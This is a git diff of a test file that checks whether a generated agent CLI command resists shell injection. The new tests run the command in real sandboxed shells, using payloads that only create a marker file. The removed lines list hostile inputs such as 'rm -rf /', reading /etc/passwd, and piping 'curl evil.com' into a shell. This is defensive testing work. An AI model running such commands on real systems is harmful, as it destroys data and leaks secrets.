@@ -1,4 +1,17 @@
-import { describe, expect, it, vi } from "vitest";
+import { spawnSync } from "node:child_process";
+import {
+  chmodSync,
+  existsSync,
+  mkdirSync,
+  mkdtempSync,
+  readFileSync,
+  realpathSync,
+  rmSync,
+  writeFileSync,
+} from "node:fs";
+import { tmpdir } from "node:os";
+import { join } from "node:path";
+import { afterAll, beforeAll, describe, expect, it, vi } from "vitest";
 import {
   formatCommitAgentPrompt,
   getAgentCommitCliCommand,
@@ -39,34 +52,125 @@ describe("agentCommit stress testing & hardening", () => {
     expect(prompt).not.toContain("\u202e");
   });
 
-  it("prevents shell injection in getAgentCommitCliCommand across 1,000 hostile vectors", () => {
-    const hostilePrompts = [
-      '$(rm -rf /)',
-      '`cat /etc/passwd`',
-      '"; rm -rf /; echo "',
-      "'; DROP TABLE commits; --",
-      "test\nrm -rf *\n",
-      'test\r\necho "pwned"',
-      'hello" && curl evil.com/leak | sh && echo "',
-      "test\\x00inject",
-      '""$IFS$9cat$IFS/etc/passwd',
-      "| touch /tmp/pwned",
-      "& start calc.exe",
+  /**
+   * The copy-paste command is judged by a real shell, not by its string shape.
+   *
+   * This used to assert `cd "/repo/$(evil)"` under the name "prevents shell
+   * injection" — but double quotes stop neither `$(...)` nor backticks, so
+   * that exact string runs `evil` in every POSIX shell. The only honest
+   * oracle is to run the command: a fake `agy`/`claude` on PATH records the
+   * argv it was handed, the repository directory itself carries a hostile
+   * name, and any payload that executes leaves a marker file behind.
+   */
+  describe.skipIf(process.platform === "win32")("copy-paste CLI command under a real shell", () => {
+    const shells = ["/bin/sh", "/bin/bash", "/bin/zsh"].filter((shell) => existsSync(shell));
+    let sandbox = "";
+    let bin = "";
+
+    beforeAll(() => {
+      sandbox = mkdtempSync(join(tmpdir(), "gp-agent-cli-"));
+      bin = join(sandbox, "bin");
+      mkdirSync(bin);
+      for (const name of ["agy", "claude"]) {
+        const script = join(bin, name);
+        // NUL-separated argv, plus the directory the shell actually reached.
+        writeFileSync(
+          script,
+          '#!/bin/sh\nout="$GP_ARGV_OUT"\npwd > "$out.cwd"\nprintf \'%s\\0\' "$@" > "$out"\n',
+        );
+        chmodSync(script, 0o755);
+      }
+    });
+
+    afterAll(() => {
+      if (sandbox) rmSync(sandbox, { recursive: true, force: true });
+    });
+
+    const marker = () => join(sandbox, "PWNED");
+    const payloads = (): string[] => [
+      `$(touch ${marker()})`,
+      `\`touch ${marker()}\``,
+      `"; touch ${marker()}; echo "`,
+      `'; touch ${marker()}; echo '`,
+      `' && touch ${marker()} && echo '`,
+      `test\ntouch ${marker()}\n`,
+      `test\r\ntouch ${marker()}`,
+      `hello" && touch ${marker()} && echo "`,
+      `""$IFS$9touch$IFS${marker()}`,
+      `| touch ${marker()}`,
+      `& touch ${marker()}`,
+      `$'\\x27'; touch ${marker()}`,
+      `!!; touch ${marker()}`,
+      "it's a 'quoted' \\ backslash",
+      "-leading-dash --flag",
+      "",
+      "unicode 🚀 ünïcödé \u202e rtl",
     ];
 
-    for (const prompt of hostilePrompts) {
-      const agyCmd = getAgentCommitCliCommand("agy", prompt, "/repo/$(evil)");
-      const claudeCmd = getAgentCommitCliCommand("claude", prompt, "/repo/`evil`");
-
-      // Verify JSON.stringify guarantees safe quoting for shell interpretation
-      expect(agyCmd).toContain('cd "/repo/$(evil)" && agy --prompt-interactive ');
-      expect(claudeCmd).toContain('cd "/repo/`evil`" && claude -- ');
-
-      // The prompt itself must be enclosed in valid JSON string format
-      const agyJsonPart = agyCmd.slice(agyCmd.indexOf('--prompt-interactive ') + '--prompt-interactive '.length);
-      const parsedPrompt = JSON.parse(agyJsonPart);
-      expect(parsedPrompt).toBe(prompt);
+    function run(shell: string, command: string) {
+      const out = join(sandbox, "argv");
+      rmSync(out, { force: true });
+      rmSync(`${out}.cwd`, { force: true });
+      const result = spawnSync(shell, ["-c", command], {
+        cwd: sandbox,
+        env: { PATH: `${bin}:/usr/bin:/bin`, GP_ARGV_OUT: out, HOME: sandbox },
+        encoding: "utf8",
+        timeout: 10_000,
+      });
+      const argv = existsSync(out) ? readFileSync(out, "utf8").split("\0").slice(0, -1) : null;
+      const cwd = existsSync(`${out}.cwd`) ? readFileSync(`${out}.cwd`, "utf8").trim() : null;
+      return { status: result.status, stderr: result.stderr, argv, cwd };
     }
+
+    it("hands every hostile prompt to the agent byte-for-byte and executes none of it", () => {
+      expect(shells.length).toBeGreaterThan(0);
+      const repo = join(sandbox, `repo $(touch ${marker()}) \`touch ${marker()}\` it's`);
+      mkdirSync(repo, { recursive: true });
+      const realRepo = realpathSync(repo);
+      let runs = 0;
+      for (const shell of shells) {
+        for (const prompt of payloads()) {
+          for (const launcher of ["agy", "claude"] as const) {
+            const label = `${shell} ${launcher} ${JSON.stringify(prompt)}`;
+            const outcome = run(shell, getAgentCommitCliCommand(launcher, prompt, repo));
+            runs += 1;
+            expect(outcome.status, `${label}: ${outcome.stderr}`).toBe(0);
+            const expected = launcher === "agy" ? ["--prompt-interactive", prompt] : ["--", prompt];
+            expect(outcome.argv, label).toEqual(expected);
+            expect(outcome.cwd && realpathSync(outcome.cwd), label).toBe(realRepo);
+            expect(existsSync(marker()), `${label} executed its payload`).toBe(false);
+          }
+        }
+      }
+      expect(runs).toBe(shells.length * payloads().length * 2);
+    });
+
+    it("survives a seeded fuzz of shell metacharacters without executing or altering a byte", () => {
+      const alphabet = [..."'\"$`\\!;&|<>(){}[]*?~#%^=,. \t\n\rab-_/:@", "🚀", "é", "\u202e"];
+      let seed = 0x9e3779b9;
+      const next = () => {
+        seed = (Math.imul(seed, 1664525) + 1013904223) >>> 0;
+        return seed;
+      };
+      const repo = join(sandbox, "fuzz repo 'x' $(y)");
+      mkdirSync(repo, { recursive: true });
+      let runs = 0;
+      for (const shell of shells) {
+        for (let i = 0; i < 100; i += 1) {
+          const length = next() % 40;
+          let prompt = "";
+          for (let c = 0; c < length; c += 1) prompt += alphabet[next() % alphabet.length];
+          const launcher = i % 2 === 0 ? "agy" : "claude";
+          const label = `${shell} ${JSON.stringify(prompt)}`;
+          const outcome = run(shell, getAgentCommitCliCommand(launcher, prompt, repo));
+          runs += 1;
+          expect(outcome.status, `${label}: ${outcome.stderr}`).toBe(0);
+          expect(outcome.argv?.at(-1), label).toBe(prompt);
+          expect(existsSync(marker()), label).toBe(false);
+        }
+      }
+      expect(runs).toBe(shells.length * 100);
+    });
   });
 
   it("prevents Python code injection in getAgentCommitSdkSnippet across hostile inputs", () => {
